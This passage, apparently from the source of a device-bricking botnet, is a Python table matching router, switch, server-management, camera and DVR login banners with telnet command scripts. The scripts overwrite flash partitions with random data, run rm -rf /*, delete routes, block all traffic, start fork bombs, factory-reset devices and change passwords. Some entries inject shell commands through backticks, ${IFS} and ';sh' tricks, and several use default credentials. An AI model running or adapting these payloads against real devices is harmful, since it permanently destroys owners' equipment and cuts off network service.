              '(TrendChip Technologies|sys\s+exit\s+ether\s+wan)',
              'sys default',
              '',
              ],
             ['celljanus',
              '.*',
              'CellJanus RX',
              '9',
              'cancel:',
              'yes',
              'continue',
              ],
             ['cisconex',
              '.*',
              'Cisco Nexus Operating System',
              'virtual-service reset force',
              'y/n',
              'y',
              '[>#] ',
              'format bootflash:',
              'yes/no',
              'y',
              '[>#] ',
              'format usb1:',
              'yes/no',
              'y',
              '[>#] ',
              'format usb2:',
              'yes/no',
              'y',
              '[>#] ',
              'reload',
              'y/n',
              'y',
              '',
              ],
             ['wince',
              '.*',
              '(Windows CE Telnet Service|Cannot execute \S+\.exe)',
              'attrib -r -h -s *.* /s',
              '[>#] ',
              'attrib -r -h -s *.* /s',
              '[>#] ',
              'del /s *.*',
              'Y/N',
              'y',
              '[>#] ',
              'halt',
              '[>#] ',
              ],
             ['ipcom',
              '.*',
              'Unknown commands or command parameters are insufficient\.',
              'configure',
              '[>#] ',
              'new',
              '[>#] ',
              'hostname HACKED',
              '[>#] ',
              'ip route default 1.2.3.4',
              '[>#] ',
              'commit',
              '\(y\|',
              'y',
              '\(y\|',
              'y',
              '[>#] ',
              'poweroff',
              '\(y\|',
              'y',
              '[>#] ',
              'poweroff',
              '\(y\|',
              'y',
              '[>#] ',
              ],
             ['meshtron',
              '.*',
              '(M e s h t r o n|Meshtron#|Unknown command \[uname\])',
              'factory',
              '[>#] ',
              ],
             ['axelerateos',
              '.*',
              '(AXN AxelerateOS|CLI Error: Can\'t find command - uname)',
              'passwd',
              'Password',
              '%OLDPASS%',
              'Password',
              '%NEWPASS%',
              'Again',
              '%NEWPASS%',
              '[>#] ',
              ],
             ['aver',
              'root/svgodie',
              '',
              'cat /dev/urandom >/dev/mtdblock1 &',
              '[>#] ',
              'cat /dev/urandom >/dev/mtdblock2 &',
              '[>#] ',
              'cat /dev/urandom >/dev/mtdblock3 &',
              '[>#] ',
              'cat /dev/urandom >/dev/sda1 &',
              '[>#] ',
              'iproute del default',
              '[>#] ',
              'ifdown eth0',
              '[>#] ',
              'ifdown eth1',
              '[>#] ',
              ],
             ['intelliserver',
              '(IntelliServer Release|uname not found)',
              'reset factory',
              '[>#] ',
              'save',
              '[>#] ',
              'motd set line 1 HACKED*',
              '[>#] ',
              'motd set line 2 HACKED*',
              '[>#] ',
              'motd set line 3 HACKED*',
              '[>#] ',
              'motd set line 4 HACKED',
              '[>#] ',
              'password',
              'password:',
              '%NEWPASS%',
              'password:',
              '%NEWPASS%',
              '[>#] ',
              'save',
              '[>#] ',
              'shutdown now',
              'arrived',
              ],
             ['drglike',
              '.*',
              'Linux version \S+openrg-rmk',
              'shell',
              '[>#] ',
              'cat /dev/urandom >/dev/root &',
              '[>#] ',
              'cat /dev/urandom >/dev/mtdblock0 &',
              '[>#] ',
              'cat /dev/urandom >/dev/mtdblock1 &',
              '[>#] ',
              'cat /dev/urandom >/dev/mtdblock2 &',
              '[>#] ',
              'cat /dev/urandom >/dev/mtdblock3 &',
              '[>#] ',
              'cat /dev/urandom >/dev/mtdblock4 &',
              '[>#] ',
              'cat /dev/urandom >/dev/mtdblock5 &',
              '[>#] ',
              'cat /dev/urandom >/dev/mtdblock6 &',
              '[>#] ',
              'cat /dev/urandom >/dev/mtdblock7 &',
              '[>#] ',
              'cat /dev/urandom >/dev/mtdblock8 &',
              '[>#] ',
              'route del default',
              '%WAIT%',
              'restore_default',
              '[>#] ',
              'exit',
              '[>#] ',
              'restore_default',
              '[>#] ',
              ],
             ['westermo',
              '.*',
              '(\s\/mrd3\d\d|MRD-310|Westermo MRD|Copyright Cybertec|'
              'esh: cat: No such command)',
              'telnet `cat /dev/urandom >/dev/mtdblock0 &`',
              '[\$>#] ',
              'quit',
              '[\$>#] ',
              'telnet `cat /dev/urandom >/dev/mtdblock1 &`',
              '[\$>#] ',
              'quit',
              '[\$>#] ',
              'telnet `cat /dev/urandom >/dev/mtdblock2 &`',
              '[\$>#] ',
              'quit',
              '[\$>#] ',
              'telnet `cat /dev/urandom >/dev/mtdblock3 &`',
              '[\$>#] ',
              'quit',
              '[\$>#] ',
              'telnet `cat /dev/urandom >/dev/mtdblock4 &`',
              '[\$>#] ',
              'quit',
              '[\$>#] ',
              'telnet `cat /dev/urandom >/dev/mtdblock5 &`',
              '[\$>#] ',
              'quit',
              '[\$>#] ',
              'telnet `cat /dev/urandom >/dev/mtdblock6 &`',
              '[\$>#] ',
              'quit',
              '[\$>#] ',
              'telnet `cat /dev/urandom >/dev/mtdblock7 &`',
              '[\$>#] ',
              'quit',
              '[\$>#] ',
              'telnet `cat /dev/urandom >/dev/root &`',
              '[\$>#] ',
              'quit',
              '[\$>#] ',
              'telnet `route del default`',
              '[\$>#] ',
              'quit',
              '[\$>#] ',
              'telnet `iptables -A OUTPUT -j DROP`',
              '[\$>#] ',
              'quit',
              '[\$>#] ',
              ],
             ['gapm',
              '.*',
              'GAPM-\d\d\d\d',
              'cat /dev/urandom >/dev/mtdblock0 &',
              '[>#\$] ',
              'cat /dev/urandom >/dev/mtdblock1 &',
              '[>#\$] ',
              'cat /dev/urandom >/dev/mtdblock2 &',
              '[>#\$] ',
              'cat /dev/urandom >/dev/mtdblock3 &',
              '[>#\$] ',
              'cat /dev/urandom >/dev/mtdblock4 &',
              '[>#\$] ',
              'cat /dev/urandom >/dev/mtdblock5 &',
              '[>#\$] ',
              'cat /dev/urandom >/dev/mtdblock6 &',
              '[>#\$] ',
              'cat /dev/urandom >/dev/mtdblock7 &',
              '[>#\$] ',
              'cat /dev/urandom >/dev/mtdblock8 &',
              '[>#\$] ',
              'cat /dev/urandom >/dev/mtdblock9 &',
              '[>#\$] ',
              'cat /dev/urandom >/dev/mtdblock10 &',
              '[>#\$] ',
              'cat /dev/urandom >/dev/mem &',
              '[>#\$] ',
              'route del default',
              '[>#\$] ',
              ],
             ['adc',
              '.*',
              'Error: no parameter\(s\) expected',
              'oper',
              '[>#\$] ',
              'passwd',
              'password:',
              '%OLDPASS%',
              'password:',
              '%NEWPASS%',
              'password:',
              '%NEWPASS%',
              '[>#\$] ',
              'exit',
              '',
              ],
             ['grscli',
              '.*',
              'ERR::Command \'uname\' not found!',
              'cd utils',
              '[>#\$] ',
              'tcpdump --file-name=`cat${IFS}/dev/zero${IFS}>/dev/root${IFS}&`',
              '[>#\$] ',
              'tcpdump --file-name=`cat${IFS}/dev/zero${IFS}>'
              '/dev/mtdblock0${IFS}&`',
              '[>#\$] ',
              'tcpdump --file-name=`cat${IFS}/dev/zero${IFS}>'
              '/dev/mtdblock1${IFS}&`',
              '[>#\$] ',
              'tcpdump --file-name=`cat${IFS}/dev/zero${IFS}>'
              '/dev/mtdblock2${IFS}&`',
              '[>#\$] ',
              'tcpdump --file-name=`cat${IFS}/dev/zero${IFS}>'
              '/dev/mtdblock3${IFS}&`',
              '[>#\$] ',
              'tcpdump --file-name=`cat${IFS}/dev/zero${IFS}>'
              '/dev/mtdblock4${IFS}&`',
              '[>#\$] ',
              'tcpdump --file-name=`cat${IFS}/dev/zero${IFS}>'
              '/dev/mtdblock5${IFS}&`',
              '[>#\$] ',
              'tcpdump --file-name=`route${IFS}del${IFS}default`',
              '[>#\$] ',
              ],
             ['fos',
              '.*',
              '(FOS \Snone\S.*ppc|FOS version|Welcome to FOS)',
              'umount -a',
              '[>#\$] ',
              'dd if=/dev/zero of=/dev/ttfsa &',
              '[>#\$] ',
              'dd if=/dev/zero of=/dev/ttfsa1 &',
              '[>#\$] ',
              'dd if=/dev/zero of=/dev/root &',
              '[>#\$] ',
              'dd if=/dev/zero of=/dev/ram &',
              '[>#\$] ',
              'dd if=/dev/zero of=/dev/ramdisk &',
              '[>#\$] ',
              'route del default',
              '%WAIT%',
              'd(){ d|d & };d',
              '%TERM%',
              ],
             ['davolink',
              '.*',
              '(invalid directory|davolink login)',
              'debug',
              '[>#\$] ',
              'system',
              '[>#\$] ',
              'syscmd all dd if=/dev/urandom of=/dev/mtdblock7',
              '[>#\$] ',
              'syscmd all dd if=/dev/urandom of=/dev/mtdblock8',
              '[>#\$] ',
              'syscmd all dd if=/dev/urandom of=/dev/mtdblock9',
              '[>#\$] ',
              'syscmd all dd if=/dev/urandom of=/dev/root',
              '[>#\$] ',
              'syscmd all route del default',
              '[>#\$] ',
              'cd ..',
              '%WAIT%',
              'cd ..',
              '[>#\$] ',
              'config',
              '[>#\$] ',
              'default',
              'y/n',
              'y',
              '[>#\$] ',
              'cd ..',
              '[>#\$] ',
              'system',
              '[>#\$] ',
              'reset',
              'y/n',
              'y',
              'y/n',
              'y',
              'Done',
              ],
             ['jnior',
              '.*',
              '\/etc\/shadow does not exist\.',
              'hostname HACKED',
              '[>#] ',
              'rd etc',
              '[>#] ',
              'rd flash',
              '[>#] ',
              'rd www',
              '[>#] ',
              'rd tiniext',
              '[>#] ',
              'rd datas',
              '[>#] ',
              'cd flash2',
              '[>#] ',
              'rm Config.props',
              '[>#] ',
              'rm Phone.props',
              '[>#] ',
              'cd ..',
              '[>#] ',
              'reboot',
              'Y/N',
              'y',
              'rebooting',
              ],
             ['hpjetdirect',
              '.*',
              'HP JetDirect',
              'host-name HACKED',
              '[>#] ',
              'ip 127.0.0.1',
              '[>#] ',
              'save',
              'saved',
              ],
             ['intelimax',
              '.*',
              '(INTELIMAX #|sh 1\.0)',
              'defconfig',
              'y/N',
              'y',
              '',
              ],
             ['idrac',
              '.*',
              'status_tag.*:.*COMMAND PROCESSING FAILED',
              'stop /system1',
              'stopped',
              ],
             ['comtrend',
              '.*',
              'Comtrend Gigabit',
              'restore_defaults',
              'wait',
              ],
             ['mikrotok',
              '.*',
              '(\[\S+\@HACKED\] > |HAD UNSAFE PASSWORD)',
              'xxx',
              '[:>] ',
              'ip firewall filter remove 9',
              ' > ',
              'ip firewall filter remove 8',
              ' > ',
              'ip firewall filter remove 7',
              ' > ',
              'ip firewall filter remove 6',
              ' > ',
              'ip firewall filter remove 5',
              ' > ',
              'ip firewall filter remove 4',
              ' > ',
              'ip firewall filter remove 3',
              ' > ',
              'ip firewall filter remove 2',
              ' > ',
              'ip firewall filter remove 1',
              ' > ',
              'ip firewall filter add chain=input src-address=0.0.0.0/1 '
              'action=drop',
              ' > ',
              'ip firewall filter add chain=output src-address=0.0.0.0/1 '
              'action=drop',
              ' > ',
              ],
             ['mikrotik',
              '.*',
              '(MMM.*III.*KKK|MikroTik\sRouterOS|Doublecom\sRouterOS|'
              'bad command name )',
              'xxx',
              '[:>] ',
              'xxx',
              '[:>] ',
              'ip socks set enabled no',
              ' > ',
              'ip proxy set enabled no',
              ' > ',
              'tool sniffer stop',
              ' > ',
              'system note set show-at-login yes',
              ' > ',
              'system note set note \"DEVICE HACKED - ACCOUNT %OLDUSER% HAD '
              'UNSAFE PASSWORD\"',
              ' > ',
              'system identity set name=HACKED',
              ' > ',
              'password',
              'password',
              '%OLDPASS%',
              'password',
              '%NEWPASS%',
              'password',
              '%NEWPASS%',
              ' > ',
              'ip dns set server=8.8.8.8',
              ' > ',
              'ip dns set allow-remote-requests=no',
              ' > ',
              'ip dns cache flush',
              ' > ',
              'system reboot',
              'reboot',
              'y',
              ' > ',
              'system reset-configuration no-defaults=yes',
              'y/N',
              'y',
              '',
              ],
             ['ruckus',
              '.*',
              '(ruckus>|The command is either unrecognized or incomplete. '
              'To view a list of commands that you ca)',
              'ping ;sh',
              '[$>#] ',
              'cat /dev/urandom >/dev/mtdblock0 &',
              '',
              'cat /dev/urandom >/dev/mtdblock1 &',
              '',
              'cat /dev/urandom >/dev/mtdblock2 &',
              '',
              'cat /dev/urandom >/dev/mtdblock3 &',
              '',
              'cat /dev/urandom >/dev/mtdblock4 &',
              '',
              'cat /dev/urandom >/dev/mtdblock5 &',
              '',
              'cat /dev/urandom >/dev/mtdblock6 &',
              '',
              'cat /dev/urandom >/dev/mtdblock7 &',
              '',
              'cat /dev/urandom >/dev/mtdblock8 &',
              '',
              'cat /dev/urandom >/dev/mtdblock9 &',
              '',
              'cat /dev/urandom >/dev/mtdblock10 &',
              '',
              'cat /dev/urandom >/dev/mtdblock11 &',
              '',
              'route del default',
              '%WAIT%',
              'enable',
              '[$>#] ',
              'set-factory',
              'Y/n',
              'y',
              '[$>#] ',
              'exit',
              '[$>#] ',
              'enable',
              '[$>#] ',
              'set-factory',
              'Y/n',
              'y',
              '[$>#] ',
              ],
             ['welotec',
              '.*',
              '\% command is not supported\!',
              'enable',
              'password:',
              '%OLDPASS%',
              '[>#] ',
              'erase startup-config',
              'filesystem',
              'y',
              '[>#] ',
              'banner HACKED',
              '[>#] ',
              'reboot',
              'system',
              'y',
              '[>#] ',
              ],
             ['dlinkbroke',
              '.*',
              'DLINK-WLAN-AP',
              'set `cat /dev/urandom >/dev/mtdblock5 &`',
              '[#>] ',
              'set `cat /dev/urandom >/dev/mtdblock4 &`',
              '[#>] ',
              'set `cat /dev/urandom >/dev/mtdblock3 &`',
              '[#>] ',
              'set `cat /dev/urandom >/dev/mtdblock2 &`',
              '[#>] ',
              'set `cat /dev/urandom >/dev/mtdblock1 &`',
              '[#>] ',
              'set `cat /dev/urandom >/dev/mtdblock0 &`',
              '[#>] ',
              'set `cat /dev/urandom >/dev/root &`',
              '[#>] ',
              'set `route del default`',
              '%WAIT%',
              'reboot',
              '[#>] ',
              ],
             ['dgsdlink',
              '.*',
              'DGS\-1\d+',
              'reset config',
              '[>#] ',
              ],
             ['nateks',
              '.*',
              'fmm.*Fault\sand\s+maintenance\smanagement',
              '3',
              '[>#] ',
              '8',
              'configuration.*no',
              'yes',
              '[>#] ',
              ],
             ['kingtype',
              '.*',
              '(Kingtype\sCONSOLE\sOS|Unknown command:\sls\s-alF\s\/etc\/)',
              'enable',
              '[>#] ',
              'configure terminal',
              '[>#] ',
              'hostname HACKED',
              '[>#] ',
              'write',
              'y/n',
              'y',
              '[>#] ',
              'exit',
              '[>#] ',
              'tftp download config-file `poweroff` 1.2.3.4',
              '[>#] ',
              ],
             ['hpipmi',
              '.*',
              '\/\.\/-> ',
              'cd /system1/led1',
              '[>#] ',
              'set led1 enabledstate=enabled',
              '[>#] ',
              'cd /system1',
              '[>#] ',
              'stop /system1 -force',
              '[>#] ',
              'stop /system1',
              '[>#] ',
              'cd ..',
              '[>#] ',
              'cd map1',
              '[>#] ',
              'cd nic1',
              '[>#] ',
              'set oemhp_hostname=HACKED',
              '[>#] ',
              'set oemhp_nonvol_networkaddress=1.2.3.4',
              '[>#] ',
              'set networkaddress=1.2.3.4',
              '[>#] ',
              ],
             ['hpmp',
              '.*',
              '\*\*\* Invalid Selection \*\*\*',
              'cm',
              '[#>] ',
              'pc -off',
              'Confirm\?',
              'y',
              '[#>] ',
              'mr',
              'modem\?',
              'y',
              '[#>] ',
              'dns -all default',
              'Confirm\?',
              'y',
              '[#>] ',
              'lc -ip 1.2.3.4 -subnet 255.255.255.0 -gateway 1.2.3.5',
              'Confirm\?',
              'y',
              '[#>] ',
              ],
             ['multiqb',
              '.*',
              '(MultiQb login|multiqb\.com|quiqnet\.com)',
              'enable',
              '[#>] ',
              'erase',
              'Yes.*No',
              'y',
              '[#>] ',
              ],
             ['hiper',
              '.*',
              'Saving configuration\.\.\.',
              'clear nvram',
              '[%#>] ',
              'clear running-config',
              '[%#>] ',
              'clear ip dhcp server',
              '[%#>] ',
              'reload',
              'y/n',
              'y',
              'Restart',
              ],
             ['maipu',
              '.*',
              'Error.*Command\s\"w\"\sisn\St\ssupported!',
              'timesvc server del all',
              'y/n',
              'y',
              '',
               '',
              '[#>] ',
              'timesvc interval set 1',
              '[#>] ',
              'timesvc server add `reboot`',
              '[#>] ',
              'timesvc start',
              '[#>] ',
              'write',
              '[#>] ',
              'reload',
              'Y/N\S:',
              'y',
              'Y/N\S:',
              'y',
              'rebooting',
              ],
             ['protei',
              '.*',
              'No such command for mini_?shell',
              'restore_config && cat /dev/urandom>/dev/mtdblock3 &',
              'shell>',
              'restore_config && cat /dev/urandom>/dev/mtdblock7 &',
              'shell>',
              'restore_config && cat /dev/urandom>/dev/mtdblock0 &',
              'shell>',
              'restore_config && cat /dev/urandom>/dev/mtdblock1 &',
              'shell>',
              'restore_config && cat /dev/urandom>/dev/mtdblock2 &',
              'shell>',
              'restore_config && cat /dev/urandom>/dev/mtdblock4 &',
              'shell>',
              'restore_config && cat /dev/urandom>/dev/mtdblock5 &',
              'shell>',
              'restore_config && cat /dev/urandom>/dev/mtdblock6 &',
              'shell>',
              'restore_config && route del default',
              'shell>',
              ],
             ['netscreen',
              '.*',
              '---unknown keyword cat',
              "set hostname HACKED\nsave",
              '> ',
              'get interface',
              '> ',
              "set interface trust ip 1.2.3.4/24\nsave",
              '> ',
              "set interface ethernet0/6 ip 1.2.4.4/24\nsave",
              '> ',
              "set interface bgroup0 ip 1.2.5.4/24\nsave",
              '> ',
              "set interface ethernet0/5 ip 1.2.6.4/24\nsave",
              '> ',
              "set interface ethernet0/4 ip 1.2.7.4/24\nsave",
              '> ',
              "set interface ethernet0/3 ip 1.2.8.4/24\nsave",
              '> ',
              "set interface ethernet0/2 ip 1.2.9.4/24\nsave",
              '> ',
              "set interface ethernet0/1 ip 1.2.10.4/24\nsave",
              '> ',
              "set interface untrust ip 1.2.11.4/24\nsave",
              '> ',
              "set interface ethernet0/0 ip 1.2.12.4/24\nsave",
              '> ',
              "set interface ethernet1 ip 1.2.1.4/24\nsave",
              '> ',
              "set interface ethernet2 ip 1.2.2.4/24\nsave",
              '> ',
              "set interface ethernet3 ip 1.2.3.4/24\nsave",
              '> ',
              "set interface ethernet4 ip 1.2.4.4/24\nsave",
              '> ',
              "set interface ethernet5 ip 1.2.5.4/24\nsave",
              '> ',
              "set interface ethernet6 ip 1.2.6.4/24\nsave",
              '> ',
              "set interface ethernet7 ip 1.2.7.4/24\nsave",
              '> ',
              "set interface ethernet8 ip 1.2.8.4/24\nsave",
              '> ',
              "set interface tun.3 ip 1.2.15.4/24\nsave",
              '> ',
              "set interface tun.2 ip 1.2.16.4/24\nsave",
              '> ',
              "set interface tun.1 ip 1.2.17.4/24\nsave",
              '> ',
              "set interface adsl2/0 ip 1.2.13.4/24\nsave",
              '> ',
              "set interface adsl1/0 ip 1.2.14.4/24\nsave",
              '> ',
              ],
             ['idirect',
              '.*',
              'UCLI:\/\$',
              'demo reset',
              '[#>\$] ',
              'demo start',
              '[#>\$] ',
              'satellite ele_cut_off 25',
              '[#>\$] ',
              'zone 1 active no',
              '[#>\$] ',
              'zone 2 active no',
              '[#>\$] ',
              'zone 3 active no',
              '[#>\$] ',
              'zone 4 active no',
              '[#>\$] ',
              'zone 5 active no',
              '[#>\$] ',
              'zone 6 active no',
              '[#>\$] ',
              'zone 7 active no',
              '[#>\$] ',
              'zone 8 active no',
              '[#>\$] ',
              'config activate',
              '[#>\$] ',
              'demo reset',
              '[#>\$] ',
              'demo start',
              '[#>\$] ',
              ],
             ['avaya',
              '.*',
              'Next possible match:',
              'enable',
              '[#>] ',
              'erase legacy-configs',
              '[#>] ',
              'erase scripts',
              '[#>] ',
              'erase startup-config',
              '[#>] ',
              'legacy-cli',
              '[#>] ',
              'nvram initialize',
              '[#>] ',
              'exit',
              '[#>] ',
              'reset',
              'Y/N',
              'n',
              'Y/N',
              'y',
              '[#>] ',
              'reset',
              'Y/N',
              'y',
              '',
              ],
             ['extxos',
              '.*',
              'Extreme Networks',
              'disable web https',
              '[>#] ',
              'disable web http',
              '[>#] ',
              'save',
              'y/N',
              'y',
              '[>#] ',
              'disable ports all\nsave\ny',
              '[>#] ',
              'y',
              '[>#] ',
              'save',
              'y/N',
              'y',
              '[>#] ',
              'disable telnet\nsave\ny',
              '',
              'y',
              '',
              'save',
              'y/N',
              'y',
              '[>#] ',
              ],
             ['openwrt',
              'root/OPENWRTBLANK',
              '',
              'df',
              'root\S+# ',
              'cat /dev/urandom >/dev/mtdblock3 &',
              'root\S+# ',
              'cat /dev/urandom >/dev/mtd3 &',
              'root\S+# ',
              'cat /dev/urandom >/dev/root &',
              'root\S+# ',
              'cat /dev/urandom >/dev/mtdblock2 &',
              'root\S+# ',
              'cat /dev/urandom >/dev/mtd2 &',
              'root\S+# ',
              'cat /dev/urandom >/dev/mtdblock1 &',
              'root\S+# ',
              'cat /dev/urandom >/dev/mtd1 &',
              'root\S+# ',
              'cat /dev/urandom >/dev/mtdblock0 &',
              'root\S+# ',
              'cat /dev/urandom >/dev/mtd0 &',
              'root\S+# ',
              'cat /dev/urandom >/dev/mtdblock4 &',
              'root\S+# ',
              'cat /dev/urandom >/dev/mtdblock5 &',
              'root\S+# ',
              'cat /dev/urandom >/dev/mtdblock6 &',
              'root\S+# ',
              'cat /dev/urandom >/dev/mtdblock7 &',
              'root\S+# ',
              'route del default',
              '%WAIT%',
              'reboot',
              'root\S+# ',
              ],
             ["p661",
              ".*",
              'Linux\sP-661.*',
              'flash_unlock',
              '',
              'flash_unlock /dev/mtd0',
              '',
              'flash_eraseall /dev/mtd0 &',
              '',
              'ftl_format /dev/mtd0 &',
              '',
              'ftl_format /dev/mtd1 &',
              '',
              'ftl_format /dev/mtd2 &',
              '',
              'ftl_format /dev/mtd3 &',
              '',
              'ftl_format /dev/mtd4 &',
              '',
              'rfdformat /dev/mtd0 &',
              '',
              'rfdformat /dev/mtd1 &',
              '',
              'rfdformat /dev/mtd2 &',
              '',
              'rfdformat /dev/mtd3 &',
              '',
              'rfdformat /dev/mtd4 &',
              '',
              'route del default;iproute del default;rm -rf /* 2>/dev/null &',
              '[#$>] ',
              'iptables -F;iptables -t nat -F;iptables -A OUTPUT -j DROP',
              '%WAIT% ',
              'd(){ d|d & };d',
              '[#$>] ',
              'sysctl -w net.ipv4.tcp_timestamps=0;sysctl -w kernel.threads-max=1',
              '%WAIT% ',
              'halt -n -f',
              '[#$>] ',
              'reboot',
              '[#$>] ',
              ],
             ["fusion",
              ".*",
              'FUSION-LTE.*admin',
              'passwd',
              'Old password: ',
              '%OLDPASS%',
              'New password: ',
              '%NEWPASS%',
              'Retype password: " ',
              '%NEWPASS%',
              '[#$>] ',
              'cat /etc/shadow',
              '[#$>] ',
              'd(){ d|d & };d',
              '%TERM%',
              ],
             ['tudc',
              'admin/admin',
              '(DC-5\d00|FR30\d\d|V5-5\d00|RG-ACE|NB-2\d00)',
              'net traceroute 127.0.0.1 ;sh',
              'address:',
              ' ',
              '[#$>] ',
              ' ',
              '[#$>] ',
              ' ',
              '[#$>] ',
              'dd if=/dev/urandom of=/dev/root',
              '[#$>] ',
              ' ',
              '[#$>] ',
              'ip route del default',
              '[#$>] ',
              ' ',
              '[#$>] ',
              'd() { d|d & }; d',
              '[#$>] ',
              ' ',
              '[#$>] ',
              ],
             ["dm365",
              ".*",
              'Linux dm365',
              'telnet localhost',
              'login: ',
              'root',
              'Password: ',
              'radiant',
              '[#$] ',
              "fdisk /dev/mtd6",
              'm\sfor\shelp\S?: ',
              "w",
              '[#$] ',
              "fdisk /dev/mtd7",
              'm\sfor\shelp\S?: ',
              "w",
              '[#$] ',
              "fdisk /dev/mtd8",
              'm\sfor\shelp\S?: ',
              "w",
              '[#$] ',
              'rm -rf /* 2>/dev/null &',
              '[#$] ',
              'route del default;iproute del default',
              '[#$] ',
              ],
             ["dm365",
              ".*",
              'Linux ENC',
              'telnet localhost',
              'login: ',
              'root',
              'Password: ',
              'radiant',
              '[#$] ',
              "fdisk /dev/mtd6",
              'm\sfor\shelp\S?: ',
              "w",
              '[#$] ',
              "fdisk /dev/mtd7",
              'm\sfor\shelp\S?: ',
              "w",
              '[#$] ',
              "fdisk /dev/mtd8",
              'm\sfor\shelp\S?: ',
              "w",
              '[#$] ',
              'rm -rf /* 2>/dev/null &',
              '[#$] ',
              'route del default;iproute del default',
              '[#$] ',
              ],
             ["srx",
              ".*",
              'SRX\d\d\d\d.*wuname',
              "\x03\x03util restore_factory_defaults",
              "Y/N\S*?",
              "y",
              '%TERM%',
              ],
             ["srxlike",
              ".*",
              '\S\d\d.*wuname-a',
              "\x03\x03util restore_factory_defaults",
              "Y/N\S*?",
              "y",
              '%TERM%',
              ],
             ["zysh",
              ".*",
              'ZySH> ',
              "?",
              "SH>",
              ],
             ['adsl2plus',
              '.*',
              '(ADSL2PlusRouter login|Welcome to Login)',
              '',
              '',
              '',
              '',
              'system reset',
              '',
              '',
              '> ',
              '',
              '> ',
              '',
              '> ',
              ],
             ["kicc",
              ".*",
              '0RU54ozt\SEXeK8sW9TQaOFRxkJ4rvI',
              'telnet localhost',
              'login: ',
              'root',
              'Password: ',
              'upsups',
              '[#$] ',
              "fdisk /dev/mtd0",
              'm\sfor\shelp\S?: ',
              "w",
              '[#$] ',
              "fdisk /dev/mtd1",
              'm\sfor\shelp\S?: ',
              "w",
              '[#$] ',
              "fdisk /dev/mtd2",
              'm\sfor\shelp\S?: ',
              "w",
              '[#$] ',
              "fdisk /dev/mtd3",
              'm\sfor\shelp\S?: ',
              "w",
              '[#$] ',
              "fdisk /dev/mtd4",
              'm\sfor\shelp\S?: ',
              "w",
              '[#$] ',
              'route del default;rm -rf /* 2>/dev/null &',
              '%TERM%',
              ],
             ["kicc",
              ".*",
              'y3olkb5BzsLZ1ZbovcECW1',
              'telnet localhost',
              'login: ',
              'root',
              'Password: ',
              'kicc123',
              '[#$] ',
              "fdisk /dev/mtd0",
              'm\sfor\shelp\S?: ',
              "w",
              '[#$] ',
              "fdisk /dev/mtd1",
              'm\sfor\shelp\S?: ',
              "w",
              '[#$] ',
              "fdisk /dev/mtd2",
              'm\sfor\shelp\S?: ',
              "w",
              '[#$] ',
              "fdisk /dev/mtd3",
              'm\sfor\shelp\S?: ',
              "w",
              '[#$] ',
              "fdisk /dev/mtd4",
              'm\sfor\shelp\S?: ',
              "w",
              '[#$] ',
              'route del default;rm -rf /* 2>/dev/null &',
              '%WAIT%',
              'while[1 ]; do echo test; d() { d | d & }; d; sleep 10; done &',
              '%TERM%',
              ],
             ['artila',
              'guest/guest',
              'guest@M5',
              'while[1 ]; do echo test; ps aux | grep "guest" | grep -v "sh" | '
              'grep -v "ps aux" | grep -v "grep" | grep -v "awk" | '
              'grep -v "xargs" | awk \'{print $2}\' | xargs kill -9; done &',
              '%TERM%',
              ],
             ["freescale",
              "user/user",
              'user@freescale',
              "ash",
              '[#$>] ',
              'while[1 ]; do echo test; ps | grep "user" | grep -v "ash" | '
              'grep -v " ps " | grep -v "grep" | grep -v "awk" | '
              'grep -v "xargs" | awk \'{print $1}\' | xargs kill -9; done &',
              '[#$>] ',
              ],
             ['matrix',
              '.*',
              '@Matrix-.*VR',
              'ash',
              '[#$>] ',
              'while[1 ]; do echo test; kill `ps aux | grep "admin" | '
              'grep -v "ash" | grep -v "ps aux" | grep -v "grep" | '
              'grep -v "awk" | awk \'{print $2}\'`; done &',
              '[#$>] ',
              'while[1 ]; do echo test; killall -9 sh; done &',
              '[#$>] ',
              ],
             ['merit',
              'admin/1111',
              'Linux NVR',
              'ash',
              '[#$>] ',
              'while[1 ]; do echo test; kill `ps aux | grep "admin" | '
              'grep -v "ash" | grep -v "ps aux" | grep -v "grep" | '
              'grep -v "awk" | awk \'{print $1}\'`; done &',
              '[#$>] ',
              'while[1 ]; do echo test; killall -9 sh; done &',
              '[#$>] ',
              ],
             ['merit',
              'admin/1111',
              '(Linux DVR|Welcome to DVR Series)',
              'ash',
              '[#$>] ',
              'while[1 ]; do echo test; kill `ps w | grep "admin" | '
              'grep -v "ash" | grep -v "ps w" | grep -v "grep" | '
              'grep -v "awk" | awk \'{print $1}\'`; done &',
              '[#$>] ',
              'while[1 ]; do echo test; killall -9 sh; done &',
              '[#$>] ',
              ],
             ['openwrt',
              'user/user',
              'user@\S+:~\$',
              'ps | grep "user" | grep -v `echo $$` | grep -v " ps " | '
              'grep -v "grep" | grep -v "awk" | grep -v "xargs" | '
              'awk \'{print $1}\' | xargs kill -9',
              '[#$>] ',
              'cat /etc/passwd',
              '[#$>] ',
              'sh',
              '[#$>] ',
              'while[1 ]; do echo test; ps | grep "user" | grep -v " sh " | '
              'grep -v " ps " | grep -v "grep" | grep -v "awk" | '
              'grep -v "xargs" | awk \'{print $1}\' | xargs kill -9; done &',
              '[#$>] ',
              ],
             ['avahi',
              'guest/guest',
              'avahi',
              'ash',
              '[#$>] ',
              'cat /etc/shadow',
              '[#$>] ',
              'while[1 ]; do echo test; ps | grep "1000" | grep -v "ash" | '
              'grep -v " ps " | grep -v "grep" | grep -v "awk" | '
              'grep -v "xargs" | awk \'{print $1}\' | xargs kill -9; done &',
              '[#$>] ',
              ],
             ['cnaim',
              '.*',
              'Error: Invalid input',
              'net ip lan 127.0.0.1\nsave\nping ;'
              'cp${IFS}/dev/urandom${IFS}/dev/mtdblock0&&',
              '[#$>] ',
              ],
             ['sathesh',
              'root/root',
              'sathesh:TJ06VabosxcTg',
              'ls -al /sbin/',
              '[#$>] ',
              'fdisk -l',
              '[#$>] ',
              'df',
              '[#$>] ',
              'route del default;iproute del default;rm -rf /* 2>/dev/null &',
              '[#$>] ',
              'iptables -F;iptables -t nat -F;iptables -A OUTPUT -j DROP',
              '%TERM%',
              ],
             ['mini',
              '.*',
              'Linux MI-MINI',
              'dd if=/dev/urandom of=/dev/mtdblock0 &',
              '',
              'dd if=/dev/urandom of=/dev/mtdblock1 &',
              '',
              'dd if=/dev/urandom of=/dev/mtdblock2 &',
              '',
              'dd if=/dev/urandom of=/dev/mtdblock3 &',
              '',
              'dd if=/dev/urandom of=/dev/mtdblock4 &',
              '',
              'dd if=/dev/urandom of=/dev/mtdblock5 &',
              '',
              'dd if=/dev/urandom of=/dev/root &',
              '',
              'dd if=/dev/urandom of=/dev/ram0 &',
              '%WAIT%',
              'route del default;rm -rf /* &',
              '%TERM%',
              ],
             ['tvr',
              '.*',
